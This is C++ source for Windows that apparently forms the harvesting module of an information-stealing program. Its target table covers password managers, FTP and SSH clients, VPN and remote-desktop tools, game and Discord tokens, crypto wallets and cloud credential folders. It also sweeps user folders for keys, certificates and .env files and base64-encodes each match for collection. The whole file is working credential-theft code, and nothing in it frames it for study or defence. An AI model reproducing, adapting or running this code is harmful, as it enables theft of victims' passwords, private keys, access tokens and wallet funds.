#include "important_files.h"
#include <windows.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <chrono>
#include <sstream>
#include <iomanip>
#include <algorithm>

namespace fs = std::filesystem;

#pragma comment(lib, "crypt32.lib")

// Structure to define extraction targets
struct ExtractionTarget {
    std::string appName;
    std::vector<std::string> folders;
    std::vector<std::string> filePatterns; // Use "*" for all files
    bool recursive;
};

// Helper to expand environment variables in paths
static std::string expand_env_path(const std::string& path, const std::string& username) {
    std::string result = path;
    
    size_t pos;
    while ((pos = result.find("%USERNAME%")) != std::string::npos) {
        result.replace(pos, 10, username);
    }
    while ((pos = result.find("%USERPROFILE%")) != std::string::npos) {
        result.replace(pos, 13, "C:\\Users\\" + username);
    }
    while ((pos = result.find("%APPDATA%")) != std::string::npos) {
        result.replace(pos, 9, "C:\\Users\\" + username + "\\AppData\\Roaming");
    }
    while ((pos = result.find("%LOCALAPPDATA%")) != std::string::npos) {
        result.replace(pos, 14, "C:\\Users\\" + username + "\\AppData\\Local");
    }
    
    return result;
}

// Helper to check if filename matches any pattern
static bool matches_pattern(const std::string& filename, const std::vector<std::string>& patterns) {
    std::string upperFilename = filename;
    std::transform(upperFilename.begin(), upperFilename.end(), upperFilename.begin(), ::toupper);
    
    for (const auto& pattern : patterns) {
        if (pattern == "*") return true;
        
        std::string upperPattern = pattern;
        std::transform(upperPattern.begin(), upperPattern.end(), upperPattern.begin(), ::toupper);
        
        // Check extension match (e.g., ".VDF")
        if (upperPattern[0] == '.') {
            if (upperFilename.length() >= upperPattern.length()) {
                if (upperFilename.substr(upperFilename.length() - upperPattern.length()) == upperPattern) {
                    return true;
                }
            }
        }
        // Check exact filename match or contains
        else if (upperFilename.find(upperPattern) != std::string::npos) {
            return true;
        }
    }
    return false;
}

// Helper to read and encode file content
static std::optional<std::string> read_and_encode_file(const fs::path& filePath, uintmax_t fileSize) {
    if (fileSize > 5 * 1024 * 1024) return std::nullopt; // Skip files > 5MB
    
    try {
        std::ifstream file(filePath, std::ios::binary);
        if (!file) return std::nullopt;
        
        std::vector<char> buffer(fileSize);
        file.read(buffer.data(), fileSize);
        
        DWORD encodedSize = 0;
        CryptBinaryToStringA((const BYTE*)buffer.data(), (DWORD)buffer.size(),
                           CRYPT_STRING_BASE64, nullptr, &encodedSize);
        
        if (encodedSize > 0) {
            std::string encoded(encodedSize, '\0');
            CryptBinaryToStringA((const BYTE*)buffer.data(), (DWORD)buffer.size(),
                               CRYPT_STRING_BASE64, (char*)encoded.data(), &encodedSize);
            encoded.resize(encodedSize - 1);
            return encoded;
        }
    } catch (...) {}
    
    return std::nullopt;
}

// Helper to get file info and add to list
static void extract_from_path(const std::string& folderPath, const std::vector<std::string>& patterns,
                             const std::string& appName, bool recursive, std::vector<ImportantFile>& files) {
    try {
        if (!fs::exists(folderPath)) return;
        
        auto process_entry = [&](const fs::directory_entry& entry) {
            if (!entry.is_regular_file()) return;
            
            std::string filename = entry.path().filename().string();
            if (!matches_pattern(filename, patterns)) return;
            
            try {
                uintmax_t fileSize = entry.file_size();
                if (fileSize > 50 * 1024 * 1024) return; // Skip files > 50MB
                
                auto lastWriteTime = entry.last_write_time();
                auto time_t = std::chrono::system_clock::to_time_t(
                    std::chrono::system_clock::time_point(lastWriteTime.time_since_epoch()));
                std::stringstream ss;
                ss << std::put_time(std::localtime(&time_t), "%Y-%m-%d %H:%M:%S");
                
                auto content = read_and_encode_file(entry.path(), fileSize);
                
                files.push_back({
                    filename, appName, entry.path().string(),
                    static_cast<long long>(fileSize), ss.str(), content
                });
            } catch (...) {}
        };
        
        if (recursive) {
            for (const auto& entry : fs::recursive_directory_iterator(folderPath, 
                    fs::directory_options::skip_permission_denied)) {
                process_entry(entry);
            }
        } else {
            for (const auto& entry : fs::directory_iterator(folderPath, 
                    fs::directory_options::skip_permission_denied)) {
                process_entry(entry);
            }
        }
    } catch (...) {}
}

std::vector<ImportantFile> extract_important_files() {
    std::vector<ImportantFile> files;
    
    // Get username
    char username[256];
    DWORD usernameLen = sizeof(username);
    GetUserNameA(username, &usernameLen);
    std::string user(username);
    
    char userProfile[MAX_PATH];
    if (FAILED(SHGetFolderPathA(nullptr, CSIDL_PROFILE, nullptr, 0, userProfile))) {
        return files;
    }
    std::string userHome = userProfile;
    
    // Define all extraction targets
    std::vector<ExtractionTarget> targets = {
        // FileZilla
        {"FileZilla", 
         {"%APPDATA%\\FileZilla"}, 
         {"SITEMANAGER.XML", "RECENTSERVERS.XML", "FILEZILLA.XML"}, false},
        
        // Steam
        {"Steam",
         {"%LOCALAPPDATA%\\Steam", "C:\\Program Files (x86)\\Steam\\config"},
         {".VDF", ".TMP"}, true},
        
        // Microsoft Outlook
        {"Outlook",
         {"%LOCALAPPDATA%\\Microsoft\\Outlook"},
         {".OST", ".PST"}, true},
        
        // Thunderbird
        {"Thunderbird",
         {"%APPDATA%\\Thunderbird\\Profiles"},
         {"LOGINS.JSON", "KEY4.DB"}, true},
        
        // WinSCP
        {"WinSCP",
         {"%APPDATA%\\WinSCP"},
         {"WINSCP.INI", "STORED SESSIONS"}, true},
        
        // Cisco AnyConnect VPN
        {"CiscoVPN",
         {"C:\\ProgramData\\Cisco\\Cisco AnyConnect Secure Mobility Client\\Profile"},
         {".XML"}, true},
        
        // OpenVPN
        {"OpenVPN",
         {"%USERPROFILE%\\OpenVPN\\config", "%APPDATA%\\OpenVPNConnect"},
         {".OVPN", "CONFIG.JSON"}, true},
        
        // HeidiSQL
        {"HeidiSQL",
         {"%APPDATA%\\HeidiSQL"},
         {"HEIDISQL_SETTINGS.XML", "SESSIONS.XML", ".XML"}, false},
        
        // DBeaver
        {"DBeaver",
         {"%APPDATA%\\DBeaverData\\General"},
         {".DBEAVER-DATA-SOURCES.XML", "DATA-SOURCES.XML"}, true},
        
        // Visual Studio Code
        {"VSCode",
         {"%APPDATA%\\Code\\User", "%APPDATA%\\Code\\User\\globalStorage"},
         {"SETTINGS.JSON", "STATE.VSCDB", ".VSCDB"}, true},
        
        // Git Credentials
        {"Git",
         {"%USERPROFILE%"},
         {".GIT-CREDENTIALS"}, false},
        
        // KeePass
        {"KeePass",
         {"%USERPROFILE%\\Documents", "%APPDATA%\\KeePass"},
         {".KDBX", ".KDB"}, true},
        
        // Discord
        {"Discord",
         {"%APPDATA%\\Discord\\Local Storage\\leveldb"},
         {".LDB", ".LOG"}, false},
        
        // TeamViewer
        {"TeamViewer",
         {"%APPDATA%\\TeamViewer"},
         {"CONNECTIONS.XML", "TEAMVIEWER.INI", ".XML", ".INI"}, false},
        
        // Remote Desktop
        {"RemoteDesktop",
         {"%USERPROFILE%\\Documents"},
         {".RDP"}, true},
        
        // Cyberduck
        {"Cyberduck",
         {"%APPDATA%\\Cyberduck"},
         {"BOOKMARKS.PLIST", ".PLIST"}, true},
        
        // 7-Zip
        {"7Zip",
         {"%APPDATA%\\7-Zip"},
         {"7ZFM.INI"}, false},
        
        // Norton Password Manager
        {"Norton",
         {"%LOCALAPPDATA%\\Norton"},
         {"*"}, true},
        
        // Origin
        {"Origin",
         {"C:\\ProgramData\\Origin", "%LOCALAPPDATA%\\Origin"},
         {"*"}, true},
        
        // PrismLauncher (Minecraft)
        {"PrismLauncher",
         {"%APPDATA%\\PrismLauncher"},
         {"ACCOUNTS.JSON"}, true},
        
        // MultiMC (Minecraft)
        {"MultiMC",
         {"%USERPROFILE%\\Desktop\\MultiMC", "%USERPROFILE%\\Downloads\\MultiMC"},
         {"ACCOUNTS.JSON"}, true},
        
        // LunarClient (Minecraft)
        {"LunarClient",
         {"%USERPROFILE%\\.lunarclient\\settings\\game"},
         {"ACCOUNTS.JSON"}, true},
        
        // Feather (Minecraft)
        {"Feather",
         {"%APPDATA%\\.feather"},
         {"ACCOUNTS.JSON"}, true},
        
        // TLauncher (Minecraft)
        {"TLauncher",
         {"%APPDATA%\\.minecraft"},
         {"TLAUNCHERPROFILES.JSON"}, false},
        
        // Essential (Minecraft)
        {"Essential",
         {"%APPDATA%\\.minecraft\\essential"},
         {"MICROSOFT_ACCOUNTS.JSON"}, true},
        
        // ATLauncher (Minecraft)
        {"ATLauncher",
         {"%APPDATA%\\ATLauncher\\configs"},
         {"ACCOUNTS.JSON"}, true},
        
        // 1Password
        {"1Password",
         {"%LOCALAPPDATA%\\1Password"},
         {".SQLITE", ".DB"}, true},
        
        // AnyDesk
        {"AnyDesk",
         {"%APPDATA%\\AnyDesk"},
         {".CONF"}, true},
        
        // Auto FTP Manager
        {"AutoFTPManager",
         {"%LOCALAPPDATA%\\DeskShareData\\AutoFTPManager"},
         {"AUTOFTPMANAGERSETTINGS.DB", ".DB"}, true},
        
        // Azure/AWS/GCloud
        {"CloudCredentials",
         {"%USERPROFILE%\\.azure", "%USERPROFILE%\\.aws", "%APPDATA%\\gcloud", "%LOCALAPPDATA%\\.IdentityService"},
         {"*"}, true},
        
        // Bitwarden
        {"Bitwarden",
         {"%APPDATA%\\Bitwarden"},
         {"DATA.JSON", ".JSON"}, true},
        
        // FTP Manager Lite
        {"FTPManagerLite",
         {"%LOCALAPPDATA%\\DeskShareData\\FTPManagerLite"},
         {"FTPMANAGERLITESETTINGS.DB", ".DB"}, true},
        
        // FTPRush
        {"FTPRush",
         {"%APPDATA%\\FTPRush"},
         {"RUSHSITE.XML", ".XML"}, true},
        
        // Google Cloud
        {"GoogleCloud",
         {"%APPDATA%\\gcloud"},
         {".DB", ".JSON"}, true},
        
        // NordPass
        {"NordPass",
         {"%APPDATA%\\NordPass"},
         {"NORDPASS.JSON", "NORDPASS.SQLITE", ".JSON", ".SQLITE"}, true},
        
        // NordVPN
        {"NordVPN",
         {"%LOCALAPPDATA%\\NordVPN"},
         {"USER.CONFIG", ".CONFIG"}, true},
        
        // ProtonVPN
        {"ProtonVPN",
         {"%LOCALAPPDATA%\\ProtonVPN"},
         {"USER.CONFIG", ".CONFIG"}, true},
        
        // RealVNC
        {"RealVNC",
         {"%APPDATA%\\RealVNC"},
         {"*"}, true},
        
        // SmartFTP
        {"SmartFTP",
         {"%APPDATA%\\SmartFTP\\Client2.0\\Favorites"},
         {"*"}, true},
        
        // TightVNC
        {"TightVNC",
         {"%APPDATA%\\TightVNC"},
         {"*"}, true},
        
        // TotalCommander
        {"TotalCommander",
         {"%APPDATA%\\GHISLER"},
         {"WCX_FTP.INI", ".INI"}, true},
        
        // UltraVNC
        {"UltraVNC",
         {"%APPDATA%\\UltraVNC"},
         {"*"}, true},
        
        // Exodus Wallet
        {"ExodusWallet",
         {"%APPDATA%\\Exodus\\exodus.wallet"},
         {".SECO", "PASSPHRASE.JSON"}, true},
        
        // Riot Games
        {"RiotGames",
         {"%LOCALAPPDATA%\\Riot Games\\Riot Client\\Data"},
         {"RIOTGAMESPRIVATESETTINGS.YAML", ".YAML"}, true},
        
        // SSH Keys
        {"SSH",
         {"%USERPROFILE%\\.ssh"},
         {"*"}, false},
        
        // AWS Credentials
        {"AWS",
         {"%USERPROFILE%\\.aws"},
         {"CREDENTIALS", "CONFIG", "*"}, false}
    };
    
    // Process each target
    for (const auto& target : targets) {
        for (const auto& folder : target.folders) {
            std::string expandedPath = expand_env_path(folder, user);
            extract_from_path(expandedPath, target.filePatterns, target.appName, target.recursive, files);
        }
    }
    
    // Also scan for common sensitive file patterns
    std::vector<std::string> sensitivePatterns = {
        ".ENV", ".PEM", ".KEY", ".P12", ".PFX", ".CRT", ".CER",
        "CREDENTIALS", "SECRET", "TOKEN", "API_KEY", "APIKEY"
    };
    
    std::vector<std::string> commonPaths = {
        userHome + "\\Documents",
        userHome + "\\Desktop",
        userHome + "\\.config"
    };
    
    for (const auto& path : commonPaths) {
        extract_from_path(path, sensitivePatterns, "SensitiveFile", true, files);
    }
    
    return files;
}
